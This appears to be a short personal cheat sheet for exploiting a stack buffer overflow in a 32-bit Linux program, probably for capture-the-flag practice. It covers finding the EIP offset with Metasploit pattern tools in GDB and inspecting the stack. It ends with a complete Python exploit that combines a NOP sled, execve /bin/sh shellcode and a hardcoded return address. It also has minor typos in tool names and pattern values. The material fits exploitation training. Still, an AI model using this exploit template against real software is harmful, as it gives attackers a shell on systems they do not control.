How To BoF Linux
********************

Find EIP Offset
##################

Run msf-patter_create
++++++++++++++++++++++++

.. code-block:: console

   msf-pattern_create -l <random_number>
   msf-pattern_create -l 400

Start GDB
+++++++++++++++

.. code-block:: console

   gdb <file>
   gdb chal

Feed msf-patter_create string into program
+++++++++++++++++++++++++++++++++++++++++++++++++

With this make sure you look for output of EIP.

.. code-block:: console

   r <output of msf-pattern_create>

Assuming we ran this command we find this

.. code-block:: console

   0x316d4130 ('0Am1')

Run msf-patter_offset
++++++++++++++++++++++++

.. code-block:: console

   msf-pattern_offset -q <output of EIP>
   msf-pattern_offset -q 0AM1
 
Lets assume you get the output of `Exact match at offset 362`. You then run this in python and copy it in gdb

.. code-block:: console

   python -c 'print("A"*<number from offset> + "BBBB")'
   python -c 'print("A"*362 + "BBBB")'

   gdb -q <file>

   r <output of python>

This should result in EIP looking like this: `$eip   : 0x42424242 ("BBBB"?)`


Find Address of Buffer
########################

Go back to remote shell and run `gdb -q <file>`. Then run `b main`. Run the following

.. code-block:: console

    r $(python -c 'print "A"*400')

Check out the stack

.. code-block:: console

        x/64xw $esp

python3 exploit

.. code-block:: console

        #!/usr/bin/env python3
        import sys
        offset = 362
        shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
        nop = b"\x90" * (offset - len(shellcode))
        EIP = b"\x54\xf7\xff\xbf"

        payload = nop + shellcode + EIP

        sys.stdout.buffer.write(payload)

Execute the program with the buffer overflow

.. code-block:: console

   <bof_program> $(python3 exploit)
